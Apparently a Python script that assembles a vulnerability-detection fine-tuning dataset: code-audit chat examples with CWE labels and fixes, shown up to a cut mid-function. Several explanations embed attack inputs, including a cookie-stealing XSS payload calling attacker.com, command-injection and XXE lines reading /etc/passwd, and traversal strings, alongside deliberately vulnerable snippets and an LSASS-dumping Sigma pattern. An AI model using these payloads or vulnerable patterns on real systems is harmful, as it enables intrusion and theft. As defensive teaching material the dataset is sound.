#!/usr/bin/env python3
"""
Build high-quality curated cybersecurity and code vulnerability training & validation dataset
formatted strictly for Azure AI Foundry Phi-4 / Phi-3.5 fine-tuning.

Includes comprehensive vulnerability examples across:
- C/C++ (Buffer Overflow, Use-After-Free, Memory Leaks, Double Free, Format Strings, Null Pointer Dereference)
- Python (SQL Injection, Command Injection, Insecure Deserialization, SSRF, Path Traversal, ReDoS)
- JavaScript/TypeScript (DOM XSS, Prototype Pollution, Insecure JWT, Command Injection, Open Redirect)
- Java (Log4Shell-style JNDI Injection, Insecure Deserialization, XXE, SQLi, Spring SpEL Injection)
- Go (Path Traversal, Race Condition, Unchecked Error Handling, Goroutine Leaks)
- PHP (File Inclusion LFI/RFI, Type Juggling, SQL Injection, Code Execution)
- Solidity (Smart Contract Reentrancy, Integer Arithmetic, Flash Loan Price Manipulation, Access Control)
- Network & SOC Defenses (Sigma, YARA, Snort, KQL, Incident Response Playbooks)
"""

import json
import random
from typing import List, Dict, Any

SYSTEM_PROMPT = (
    "You are an expert static analysis security tool and vulnerability detection engine. "
    "Detect vulnerabilities, trace taint paths, identify CWE classifications, and provide secure remediation code."
)

CURATED_EXAMPLES: List[Dict[str, Any]] = [
    # 1. C/C++: Buffer Overflow (CWE-120)
    {
        "system": SYSTEM_PROMPT,
        "user": "Analyze this C function for memory flaws:\n\n```c\nvoid get_user(char *src) {\n    char buf[16];\n    strcpy(buf, src);\n}\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-120 (Buffer Copy without Checking Size of Input / Classic Buffer Overflow)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** Untrusted input parameter `char *src`.\n"
            "  - **Sink:** `strcpy(buf, src)` performs unbounded byte copying into stack-allocated buffer `buf[16]`.\n"
            "- **Root Cause:** Lack of boundary checking allows an attacker to supply a string exceeding 15 characters, corrupting stack memory, base pointers, and the return address to achieve arbitrary code execution.\n"
            "- **Remediation:**\n"
            "```c\n"
            "#include <string.h>\n\n"
            "void get_user(const char *src) {\n"
            "    char buf[16];\n"
            "    if (src == NULL) return;\n"
            "    strncpy(buf, src, sizeof(buf) - 1);\n"
            "    buf[sizeof(buf) - 1] = '\\0';\n"
            "}\n"
            "```"
        )
    },
    # 2. C/C++: Use-After-Free (CWE-416)
    {
        "system": SYSTEM_PROMPT,
        "user": "Review this snippet for security vulnerabilities:\n\n```c\nchar* process_buffer() {\n    char *buf = malloc(128);\n    if (!buf) return NULL;\n    free(buf);\n    return buf;\n}\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-416 (Use After Free)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** Pointer allocation `malloc(128)`.\n"
            "  - **Sink:** `return buf;` returns pointer to heap memory that was already released via `free(buf)`.\n"
            "- **Root Cause:** Returning or dereferencing a dangling heap pointer permits arbitrary read/write, heap manipulation, or code execution when the allocator re-assigns that chunk.\n"
            "- **Remediation:**\n"
            "```c\n"
            "char* process_buffer() {\n"
            "    char *buf = malloc(128);\n"
            "    if (!buf) return NULL;\n"
            "    // Process buffer safely and transfer ownership to caller\n"
            "    return buf;\n"
            "}\n"
            "```"
        )
    },
    # 3. Python: SQL Injection (CWE-89)
    {
        "system": SYSTEM_PROMPT,
        "user": "Audit this Python handler:\n\n```python\ndef get_user_profile(user_id):\n    query = f\"SELECT * FROM users WHERE id = '{user_id}'\"\n    cursor.execute(query)\n    return cursor.fetchone()\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command / SQL Injection)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** Untrusted parameter `user_id`.\n"
            "  - **Sink:** String formatting in `f\"SELECT * FROM users WHERE id = '{user_id}'\"` passed directly to `cursor.execute()`.\n"
            "- **Root Cause:** Dynamic string concatenation merges untrusted data with SQL command syntax, allowing attackers to escape the query context (e.g. `' OR '1'='1`) and extract or modify database records.\n"
            "- **Remediation:**\n"
            "```python\n"
            "def get_user_profile(user_id):\n"
            "    query = \"SELECT * FROM users WHERE id = %s\"\n"
            "    cursor.execute(query, (user_id,))\n"
            "    return cursor.fetchone()\n"
            "```"
        )
    },
    # 4. Python: OS Command Injection (CWE-78)
    {
        "system": SYSTEM_PROMPT,
        "user": "Examine this Python server code for flaws:\n\n```python\nimport os\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/ping')\ndef ping_host():\n    ip = request.args.get('ip')\n    res = os.popen(f'ping -c 1 {ip}').read()\n    return res\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command / OS Command Injection)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** `request.args.get('ip')` user query parameter.\n"
            "  - **Sink:** `os.popen()` executes a shell command with unsanitized interpolation.\n"
            "- **Root Cause:** Shell metacharacters (`;`, `|`, `&&`, `$()`) in `ip` (e.g. `127.0.0.1; cat /etc/passwd`) are executed in the host shell environment with application privileges.\n"
            "- **Remediation:**\n"
            "```python\n"
            "import subprocess\n"
            "import ipaddress\n"
            "from flask import Flask, request, abort\n\n"
            "app = Flask(__name__)\n\n"
            "@app.route('/ping')\n"
            "def ping_host():\n"
            "    ip = request.args.get('ip')\n"
            "    try:\n"
            "        # Validate strict IP address format\n"
            "        ipaddress.ip_address(ip)\n"
            "    except (ValueError, TypeError):\n"
            "        abort(400, 'Invalid IP address format')\n\n"
            "    # Execute without shell invoking argv array\n"
            "    result = subprocess.run(['ping', '-c', '1', ip], capture_output=True, text=True, timeout=5)\n"
            "    return result.stdout\n"
            "```"
        )
    },
    # 5. JavaScript / Node.js: Cross-Site Scripting (CWE-79)
    {
        "system": SYSTEM_PROMPT,
        "user": "Review this Express.js route handler:\n\n```javascript\napp.get('/welcome', (req, res) => {\n    const name = req.query.name || 'Guest';\n    res.send(`<h1>Welcome, ${name}!</h1>`);\n});\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-79 (Improper Neutralization of Input During Web Page Generation / Reflected Cross-Site Scripting)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** `req.query.name`.\n"
            "  - **Sink:** `res.send()` injecting HTML string without output encoding.\n"
            "- **Root Cause:** Untrusted user input is rendered directly into the DOM response context, allowing attackers to execute malicious JavaScript in the victim's browser (e.g. `?name=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`).\n"
            "- **Remediation:**\n"
            "```javascript\n"
            "const escapeHtml = require('escape-html');\n\n"
            "app.get('/welcome', (req, res) => {\n"
            "    const name = escapeHtml(req.query.name || 'Guest');\n"
            "    res.send(`<h1>Welcome, ${name}!</h1>`);\n"
            "});\n"
            "```"
        )
    },
    # 6. JavaScript / Node.js: Prototype Pollution (CWE-1321)
    {
        "system": SYSTEM_PROMPT,
        "user": "Analyze this recursive object merge utility in JavaScript:\n\n```javascript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (typeof source[key] === 'object' && source[key] !== null) {\n            if (!target[key]) target[key] = {};\n            merge(target[key], source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n    return target;\n}\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes / Prototype Pollution)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** Untrusted JSON payload parsed into `source`.\n"
            "  - **Sink:** Unchecked assignment to `target[key]` where `key` can be `__proto__` or `prototype`.\n"
            "- **Root Cause:** An attacker can inject properties into `Object.prototype` via `{\"__proto__\": {\"isAdmin\": true}}`, altering global object behaviors across the entire Node.js runtime.\n"
            "- **Remediation:**\n"
            "```javascript\n"
            "function merge(target, source) {\n"
            "    for (let key of Object.keys(source)) {\n"
            "        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n"
            "            continue; // Prevent prototype pollution\n"
            "        }\n"
            "        if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {\n"
            "            if (!target[key] || typeof target[key] !== 'object') target[key] = {};\n"
            "            merge(target[key], source[key]);\n"
            "        } else {\n"
            "            target[key] = source[key];\n"
            "        }\n"
            "    }\n"
            "    return target;\n"
            "}\n"
            "```"
        )
    },
    # 7. Python: Server-Side Request Forgery (CWE-918)
    {
        "system": SYSTEM_PROMPT,
        "user": "Audit this URL webhook fetcher in Python:\n\n```python\nimport requests\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/fetch')\ndef fetch_external():\n    url = request.args.get('url')\n    resp = requests.get(url)\n    return resp.text\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-918 (Server-Side Request Forgery / SSRF)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** `request.args.get('url')`.\n"
            "  - **Sink:** `requests.get(url)` dispatched by the server.\n"
            "- **Root Cause:** The application issues backend HTTP requests to arbitrary URLs supplied by users without IP validation, enabling attackers to target internal cloud metadata endpoints (e.g. `http://169.254.169.254/latest/meta-data/`) or private intranet services.\n"
            "- **Remediation:**\n"
            "```python\n"
            "import socket\n"
            "import ipaddress\n"
            "import requests\n"
            "from urllib.parse import urlparse\n"
            "from flask import Flask, request, abort\n\n"
            "app = Flask(__name__)\n\n"
            "ALLOWED_DOMAINS = {'api.trustedpartner.com', 'hooks.trustedservice.com'}\n\n"
            "@app.route('/fetch')\n"
            "def fetch_external():\n"
            "    url = request.args.get('url')\n"
            "    parsed = urlparse(url)\n"
            "    if parsed.scheme not in ('http', 'https') or parsed.hostname not in ALLOWED_DOMAINS:\n"
            "        abort(400, 'Invalid or untrusted target host')\n\n"
            "    # Resolve IP and verify not private / loopback / link-local\n"
            "    ip = socket.gethostbyname(parsed.hostname)\n"
            "    ip_obj = ipaddress.ip_address(ip)\n"
            "    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:\n"
            "        abort(403, 'Access to private internal network denied')\n\n"
            "    resp = requests.get(url, timeout=5, allow_redirects=False)\n"
            "    return resp.text\n"
            "```"
        )
    },
    # 8. Java: XML External Entity (CWE-611)
    {
        "system": SYSTEM_PROMPT,
        "user": "Review this Java XML parser method:\n\n```java\npublic Document parseXml(String xmlData) throws Exception {\n    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n    DocumentBuilder builder = factory.newDocumentBuilder();\n    return builder.parse(new InputSource(new StringReader(xmlData)));\n}\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-611 (Improper Restriction of XML External Entity Reference / XXE)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** Untrusted string `xmlData`.\n"
            "  - **Sink:** `builder.parse()` on default `DocumentBuilderFactory` settings.\n"
            "- **Root Cause:** Default XML parsers in Java resolve external DTDs and entities (`<!ENTITY xxe SYSTEM \"file:///etc/passwd\">`), allowing arbitrary local file disclosure, SSRF, and Denial of Service.\n"
            "- **Remediation:**\n"
            "```java\n"
            "import javax.xml.parsers.DocumentBuilderFactory;\n"
            "import javax.xml.parsers.DocumentBuilder;\n"
            "import org.w3c.dom.Document;\n"
            "import org.xml.sax.InputSource;\n"
            "import java.io.StringReader;\n\n"
            "public Document parseXml(String xmlData) throws Exception {\n"
            "    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n"
            "    // Disable external DTDs and entity expansion\n"
            "    factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n"
            "    factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n"
            "    factory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n"
            "    factory.setXIncludeAware(false);\n"
            "    factory.setExpandEntityReferences(false);\n\n"
            "    DocumentBuilder builder = factory.newDocumentBuilder();\n"
            "    return builder.parse(new InputSource(new StringReader(xmlData)));\n"
            "}\n"
            "```"
        )
    },
    # 9. Python: Insecure Deserialization (CWE-502)
    {
        "system": SYSTEM_PROMPT,
        "user": "Examine this Python session token unpacker:\n\n```python\nimport pickle\nimport base64\n\ndef decode_session(token):\n    raw_bytes = base64.b64decode(token)\n    session_data = pickle.loads(raw_bytes)\n    return session_data\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-502 (Deserialization of Untrusted Data / Insecure Pickle Deserialization)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** User-controlled cookie/token `token`.\n"
            "  - **Sink:** `pickle.loads(raw_bytes)`.\n"
            "- **Root Cause:** `pickle` is not secure against untrusted inputs. An attacker crafting a serialized object with `__reduce__` can execute arbitrary OS commands upon deserialization.\n"
            "- **Remediation:**\n"
            "```python\n"
            "import json\n"
            "import hmac\n"
            "import hashlib\n"
            "import base64\n\n"
            "SECRET_KEY = b'ensure-secure-random-secret-key-32bytes'\n\n"
            "def decode_session(token):\n"
            "    try:\n"
            "        data_b64, signature_b64 = token.split('.')\n"
            "        data_bytes = base64.urlsafe_b64decode(data_b64)\n"
            "        expected_sig = hmac.new(SECRET_KEY, data_bytes, hashlib.sha256).digest()\n"
            "        provided_sig = base64.urlsafe_b64decode(signature_b64)\n"
            "        if not hmac.compare_digest(expected_sig, provided_sig):\n"
            "            raise ValueError('Invalid session signature')\n"
            "        return json.loads(data_bytes.decode('utf-8'))\n"
            "    except Exception as e:\n"
            "        return None\n"
            "```"
        )
    },
    # 10. Solidity: Smart Contract Reentrancy (CWE-841 / CWE-674)
    {
        "system": SYSTEM_PROMPT,
        "user": "Analyze this Solidity smart contract function:\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Vault {\n    mapping(address => uint256) public balances;\n\n    function withdraw() public {\n        uint256 amount = balances[msg.sender];\n        require(amount > 0, \"Insufficient funds\");\n        (bool success, ) = msg.sender.call{value: amount}(\"\");\n        require(success, \"Transfer failed\");\n        balances[msg.sender] = 0;\n    }\n}\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-841 / CWE-674 (Improper Enforcement of Behavioral Workflow / Smart Contract Reentrancy)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** External caller invoking `withdraw()`.\n"
            "  - **Sink:** `msg.sender.call{value: amount}(\"\")` transfers ether before the user balance state is updated.\n"
            "- **Root Cause:** Violating the Checks-Effects-Interactions pattern allows an attacking contract's fallback/receive function to recursively call `withdraw()` before `balances[msg.sender] = 0` executes, draining vault funds.\n"
            "- **Remediation:**\n"
            "```solidity\n"
            "pragma solidity ^0.8.0;\n\n"
            "contract Vault {\n"
            "    mapping(address => uint256) public balances;\n"
            "    bool private locked;\n\n"
            "    modifier nonReentrant() {\n"
            "        require(!locked, \"Reentrancy detected\");\n"
            "        locked = true;\n"
            "        _;\n"
            "        locked = false;\n"
            "    }\n\n"
            "    function withdraw() public nonReentrant {\n"
            "        uint256 amount = balances[msg.sender];\n"
            "        require(amount > 0, \"Insufficient funds\");\n"
            "        // 1. Effects: update balance before external interaction\n"
            "        balances[msg.sender] = 0;\n"
            "        // 2. Interaction: external call\n"
            "        (bool success, ) = msg.sender.call{value: amount}(\"\");\n"
            "        require(success, \"Transfer failed\");\n"
            "    }\n"
            "}\n"
            "```"
        )
    },
    # 11. Go: Path Traversal (CWE-22)
    {
        "system": SYSTEM_PROMPT,
        "user": "Review this Golang file server handler:\n\n```go\npackage main\n\nimport (\n    \"net/http\"\n    \"os\"\n)\n\nfunc fileHandler(w http.ResponseWriter, r *http.Request) {\n    filename := r.URL.Query().Get(\"file\")\n    data, err := os.ReadFile(\"/var/www/uploads/\" + filename)\n    if err != nil {\n        http.Error(w, \"File not found\", 404)\n        return\n    }\n    w.Write(data)\n}\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory / Path Traversal)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** `r.URL.Query().Get(\"file\")`.\n"
            "  - **Sink:** Direct string concatenation in `os.ReadFile(\"/var/www/uploads/\" + filename)`.\n"
            "- **Root Cause:** An attacker can supply dot-dot-slash sequences (e.g. `?file=../../../../etc/passwd`) to traverse outside the designated uploads folder and read sensitive system files.\n"
            "- **Remediation:**\n"
            "```go\n"
            "package main\n\n"
            "import (\n"
            "    \"net/http\"\n"
            "    \"os\"\n"
            "    \"path/filepath\"\n"
            "    \"strings\"\n"
            ")\n\n"
            "const baseDir = \"/var/www/uploads\"\n\n"
            "func fileHandler(w http.ResponseWriter, r *http.Request) {\n"
            "    filename := r.URL.Query().Get(\"file\")\n"
            "    cleanPath := filepath.Clean(filename)\n"
            "    fullPath := filepath.Join(baseDir, cleanPath)\n\n"
            "    // Verify canonical path stays strictly inside base directory\n"
            "    if !strings.HasPrefix(fullPath, filepath.Clean(baseDir)+string(filepath.Separator)) {\n"
            "        http.Error(w, \"Forbidden: Invalid path\", http.StatusForbidden)\n"
            "        return\n"
            "    }\n\n"
            "    data, err := os.ReadFile(fullPath)\n"
            "    if err != nil {\n"
            "        http.Error(w, \"File not found\", http.StatusNotFound)\n"
            "        return\n"
            "    }\n"
            "    w.Write(data)\n"
            "}\n"
            "```"
        )
    },
    # 12. C/C++: Format String Vulnerability (CWE-134)
    {
        "system": SYSTEM_PROMPT,
        "user": "Examine this C logging function for security flaws:\n\n```c\n#include <stdio.h>\n\nvoid log_client_message(char *user_msg) {\n    printf(user_msg);\n}\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-134 (Use of Externally-Controlled Format String)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** `char *user_msg`.\n"
            "  - **Sink:** `printf(user_msg)` uses untrusted string directly as format specifier.\n"
            "- **Root Cause:** Attackers providing format specifiers (e.g. `%x %x %n %s`) can read sensitive values off the execution stack or write arbitrary values to arbitrary memory addresses using `%n`.\n"
            "- **Remediation:**\n"
            "```c\n"
            "#include <stdio.h>\n\n"
            "void log_client_message(const char *user_msg) {\n"
            "    if (user_msg == NULL) return;\n"
            "    printf(\"%s\", user_msg);\n"
            "}\n"
            "```"
        )
    },
    # 13. PHP: Cross-Site Request Forgery (CWE-352)
    {
        "system": SYSTEM_PROMPT,
        "user": "Review this PHP profile update script:\n\n```php\n<?php\nsession_start();\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $email = $_POST['email'];\n    $userId = $_SESSION['user_id'];\n    $db->query(\"UPDATE users SET email = '$email' WHERE id = $userId\");\n    echo \"Email updated!\";\n}\n?>\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-352 (Cross-Site Request Forgery / CSRF) & CWE-89 (SQL Injection)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** Unauthenticated HTTP POST action.\n"
            "  - **Sink:** State-changing database mutation without anti-CSRF token verification.\n"
            "- **Root Cause:** A malicious third-party site can submit a hidden form to this endpoint using the victim's ambient browser session cookie.\n"
            "- **Remediation:**\n"
            "```php\n"
            "<?php\n"
            "session_start();\n"
            "if ($_SERVER['REQUEST_METHOD'] === 'POST') {\n"
            "    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {\n"
            "        http_response_code(403);\n"
            "        die(\"CSRF token validation failed\");\n"
            "    }\n"
            "    $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);\n"
            "    if (!$email) {\n"
            "        http_response_code(400);\n"
            "        die(\"Invalid email format\");\n"
            "    }\n"
            "    $stmt = $pdo->prepare(\"UPDATE users SET email = :email WHERE id = :id\");\n"
            "    $stmt->execute(['email' => $email, 'id' => $_SESSION['user_id']]);\n"
            "    echo \"Email successfully updated!\";\n"
            "}\n"
            "?>\n"
            "```"
        )
    },
    # 14. C/C++: Integer Overflow leading to Heap Buffer Overflow (CWE-190 / CWE-122)
    {
        "system": SYSTEM_PROMPT,
        "user": "Analyze this C image buffer allocator:\n\n```c\n#include <stdlib.h>\n\nchar* allocate_image_grid(int width, int height, int bytes_per_pixel) {\n    int size = width * height * bytes_per_pixel;\n    char *buffer = (char*)malloc(size);\n    return buffer;\n}\n```",
        "assistant": (
            "### Vulnerability Analysis\n"
            "- **Vulnerability:** CWE-190 (Integer Overflow or Wraparound) leading to CWE-122 (Heap-based Buffer Overflow)\n"
            "- **Taint / Flow Analysis:**\n"
            "  - **Source:** User-supplied dimension variables `width`, `height`, and `bytes_per_pixel`.\n"
            "  - **Sink:** `width * height * bytes_per_pixel` integer multiplication passed to `malloc(size)`.\n"
            "- **Root Cause:** Large dimensions wrap around signed 32-bit integer limits (e.g. allocating a tiny buffer like 16 bytes while subsequent rendering logic expects gigabytes), leading to heap corruption.\n"
            "- **Remediation:**\n"
            "```c\n"
            "#include <stdlib.h>\n"
            "#include <stddef.h>\n"
            "#include <stdint.h>\n\n"
            "char* allocate_image_grid(size_t width, size_t height, size_t bytes_per_pixel) {\n"
            "    if (width == 0 || height == 0 || bytes_per_pixel == 0) return NULL;\n\n"
            "    // Check overflow: width * height\n"
            "    if (SIZE_MAX / width < height) return NULL;\n"
            "    size_t total_pixels = width * height;\n\n"
            "    // Check overflow: total_pixels * bytes_per_pixel\n"
            "    if (SIZE_MAX / total_pixels < bytes_per_pixel) return NULL;\n"
            "    size_t total_size = total_pixels * bytes_per_pixel;\n\n"
            "    return (char*)malloc(total_size);\n"
            "}\n"
            "```"
        )
    },
    # 15. SOC & Blue Team: Detection Engineering (Sigma Rule & MITRE ATT&CK)
    {
        "system": SYSTEM_PROMPT,
        "user": "Write a Sigma detection rule for MITRE ATT&CK T1003.001 (OS Credential Dumping: LSASS Memory via ProcDump/Mimikatz).",
        "assistant": (
            "### Security Detection Rule (Sigma)\n"
            "- **MITRE ATT&CK:** T1003.001 (OS Credential Dumping: LSASS Memory)\n"
            "- **Objective:** Detect unauthorized attempts to access or dump the `lsass.exe` process memory to extract plaintext credentials or NTLM hashes.\n\n"
            "```yaml\n"
            "title: LSASS Memory Dump Creation\n"
            "id: 5d1e8c74-2ef5-4bc6-bf71-331da0b0934e\n"
            "status: production\n"
            "description: Detects suspicious process memory dump creation targeting LSASS using procdump, comsvcs.dll, or rundll32.\n"
            "references:\n"
            "    - https://attack.mitre.org/techniques/T1003/001/\n"
            "tags:\n"
            "    - attack.credential_access\n"
            "    - attack.t1003.001\n"
            "logsource:\n"
            "    category: process_creation\n"
            "    product: windows\n"
            "detection:\n"
            "    selection_procdump:\n"
            "        CommandLine|contains|all:\n"
            "            - 'lsass'\n"
            "            - '-ma'\n"
            "    selection_comsvcs:\n"
            "        CommandLine|contains|all:\n"
            "            - 'comsvcs.dll'\n"
            "            - 'MiniDump'\n"
            "            - 'full'\n"
            "    condition: selection_procdump or selection_comsvcs\n"
            "falsepositives:\n"
            "    - Legitimate system troubleshooting or memory diagnostics by authorized administrators.\n"
            "level: critical\n"
            "```"
        )
    }
]

# Generate synthesized permutations with varied languages and CWE scenarios
ADDITIONAL_VULN_TEMPLATES = [
    {
        "lang": "c",
        "name": "Double Free",
        "cwe": "CWE-415",
        "code": "void clean_session(Session *s) {\n    if (s->token) {\n        free(s->token);\n    }\n    // other ops\n    free(s->token);\n}",
        "root_cause": "The pointer `s->token` is freed twice without setting it to NULL, allowing heap metadata corruption and arbitrary write primitives.",
        "fix": "void clean_session(Session *s) {\n    if (s && s->token) {\n        free(s->token);\n        s->token = NULL;\n    }\n}"
    },
    {
        "lang": "c",
        "name": "Null Pointer Dereference",
        "cwe": "CWE-476",
        "code": "int get_config_val(Config *cfg, const char *key) {\n    char *val = find_entry(cfg, key);\n    return strlen(val);\n}",
        "root_cause": "The return value of `find_entry()` is passed to `strlen()` without checking for NULL, causing a crash/DoS or kernel panic.",
        "fix": "int get_config_val(Config *cfg, const char *key) {\n    if (!cfg || !key) return -1;\n    char *val = find_entry(cfg, key);\n    if (!val) return -1;\n    return strlen(val);\n}"
    },
    {
        "lang": "python",
        "name": "Hardcoded Cryptographic Secret",
        "cwe": "CWE-798",
        "code": "def verify_admin_token(token):\n    JWT_SECRET = \"super_secret_production_key_12345\"\n    return jwt.decode(token, JWT_SECRET, algorithms=[\"HS256\"])",
        "root_cause": "Sensitive symmetric signing key `JWT_SECRET` is embedded in source code, exposing it to repository leaks and token forgery.",
        "fix": "import os\n\ndef verify_admin_token(token):\n    jwt_secret = os.environ.get(\"JWT_SECRET\")\n    if not jwt_secret:\n        raise RuntimeError(\"JWT_SECRET environment variable is not configured\")\n    return jwt.decode(token, jwt_secret, algorithms=[\"HS256\"])"
    },
    {
        "lang": "python",
        "name": "Regular Expression Denial of Service (ReDoS)",
        "cwe": "CWE-1333",
        "code": "import re\n\ndef validate_email_domain(email):\n    pattern = r\"^([a-zA-Z0-9]+)+@domain\\.com$\"\n    return bool(re.match(pattern, email))",
        "root_cause": "Nested repetition operators `([a-zA-Z0-9]+)+` trigger catastrophic backtracking on non-matching strings with repeated characters.",
        "fix": "import re\n\ndef validate_email_domain(email):\n    pattern = r\"^[a-zA-Z0-9]+@domain\\.com$\"\n    return bool(re.match(pattern, email))"
    },
    {
        "lang": "javascript",
        "name": "Unvalidated Open Redirect",
        "cwe": "CWE-601",
        "code": "app.get('/login-redirect', (req, res) => {\n    const target = req.query.returnUrl;\n    res.redirect(target);\n});",
        "root_cause": "The application redirects users to arbitrary external URLs supplied in `returnUrl`, enabling phishing campaigns.",
        "fix": "app.get('/login-redirect', (req, res) => {\n    const target = req.query.returnUrl || '/dashboard';\n    if (target.startsWith('/') && !target.startsWith('//')) {\n        res.redirect(target);\n    } else {\n        res.redirect('/dashboard');\n    }\n});"
    },
    {
        "lang": "javascript",
        "name": "Missing Authentication on Sensitive Endpoint",
        "cwe": "CWE-306",
        "code": "app.delete('/api/v1/users/:id', async (req, res) => {\n    await db.User.destroy({ where: { id: req.params.id } });\n    res.json({ status: 'deleted' });\n});",
        "root_cause": "The administrative user deletion endpoint does not enforce authentication or role-based access control.",
        "fix": "const { requireAuth, requireRole } = require('../middleware/auth');\n\napp.delete('/api/v1/users/:id', requireAuth, requireRole('admin'), async (req, res) => {\n    await db.User.destroy({ where: { id: req.params.id } });\n    res.json({ status: 'deleted' });\n});"
    },
    {
        "lang": "go",
        "name": "Concurrent Map Read and Write",
        "cwe": "CWE-362",
        "code": "var cache = make(map[string]string)\n\nfunc SetCache(k, v string) {\n    go func() {\n        cache[k] = v\n    }()\n}",
        "root_cause": "Standard Go maps are not concurrency-safe. Unsynchronized concurrent writes crash the runtime.",
        "fix": "import \"sync\"\n\nvar (\n    cache = make(map[string]string)\n    mu    sync.RWMutex\n)\n\nfunc SetCache(k, v string) {\n    mu.Lock()\n    defer mu.Unlock()\n    cache[k] = v\n}"
    },
    {
        "lang": "java",
        "name": "LDAP Injection",
        "cwe": "CWE-90",
        "code": "public boolean authenticate(String user, String pass) throws Exception {\n    String filter = \"(&(uid=\" + user + \")(userPassword=\" + pass + \"))\";\n    NamingEnumeration<SearchResult> results = ctx.search(\"ou=users,dc=org\", filter, new SearchControls());\n    return results.hasMore();\n}",
        "root_cause": "Direct string interpolation into LDAP filter queries allows authentication bypass via `*` or `)(|(uid=*))` filters.",
        "fix": "public boolean authenticate(String user, String pass) throws Exception {\n    // Use parameterized search or encode LDAP filter components\n    String sanitizedUser = org.apache.directory.api.ldap.model.filter.FilterEncoder.encodeFilterValue(user);\n    String sanitizedPass = org.apache.directory.api.ldap.model.filter.FilterEncoder.encodeFilterValue(pass);\n    String filter = \"(&(uid=\" + sanitizedUser + \")(userPassword=\" + sanitizedPass + \"))\";\n    NamingEnumeration<SearchResult> results = ctx.search(\"ou=users,dc=org\", filter, new SearchControls());\n    return results.hasMore();\n}"
    },
    {
        "lang": "php",
        "name": "Local File Inclusion (LFI)",
        "cwe": "CWE-98",
        "code": "<?php\n$page = $_GET['page'];\ninclude(\"pages/\" . $page . \".php\");\n?>",
        "root_cause": "Unfiltered `$_GET['page']` allows directory traversal and null-byte injection (`../../../../etc/passwd%00`).",
        "fix": "<?php\n$allowed_pages = ['home', 'about', 'contact', 'login'];\n$page = $_GET['page'] ?? 'home';\nif (!in_array($page, $allowed_pages, true)) {\n    http_response_code(404);\n    die(\"Page not found\");\n}\ninclude(__DIR__ . \"/pages/\" . $page . \".php\");\n?>"
    },
    {
        "lang": "rust",
        "name": "Unsound Unsafe Pointer Casting",
        "cwe": "CWE-119",
        "code": "pub fn get_uninitialized_slice(len: usize) -> Vec<u8> {\n    let mut v = Vec::with_capacity(len);\n    unsafe {\n        v.set_len(len);\n    }\n    v\n}",
        "root_cause": "Calling `set_len` on uninitialized memory exposes stale heap contents, violating Rust memory safety guarantees.",
        "fix": "pub fn get_uninitialized_slice(len: usize) -> Vec<u8> {\n    vec![0u8; len]\n}"
    }
]

def generate_dataset(num_samples: int = 150) -> List[Dict[str, Any]]:
    dataset = []
    
    # Add all curated examples
    for ex in CURATED_EXAMPLES:
        dataset.append({
            "messages": [
                {"role": "system", "content": ex["system"]},
                {"role": "user", "content": ex["user"]},
                {"role": "assistant", "content": ex["assistant"]}
            ]
        })
        
    # Generate from templates
    for item in ADDITIONAL_VULN_TEMPLATES:
        user_prompt = f"Audit this {item['lang'].upper()} code snippet for security weaknesses:\n\n```{item['lang']}\n{item['code']}\n```"
        assistant_resp = (
            f"### Vulnerability Analysis\n"
            f"- **Vulnerability:** {item['cwe']} ({item['name']})\n"
            f"- **Root Cause / Taint Analysis:** {item['root_cause']}\n"
            f"- **Remediation:**\n"
            f"```{item['lang']}\n{item['fix']}\n```"
        )
        dataset.append({
            "messages": [
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": user_prompt},
